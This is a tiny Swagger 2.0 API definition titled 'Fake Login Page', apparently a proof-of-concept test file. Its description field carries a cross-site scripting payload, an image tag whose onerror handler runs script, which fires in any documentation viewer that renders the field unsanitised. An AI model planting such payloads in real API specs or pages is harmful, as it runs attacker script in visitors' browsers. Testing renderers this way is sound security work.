swagger: '2.0'
info:
  version: 1.0.0
  title: Fake Login Page
  description: '<img src=x onerror=confirm(origin);/>'
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
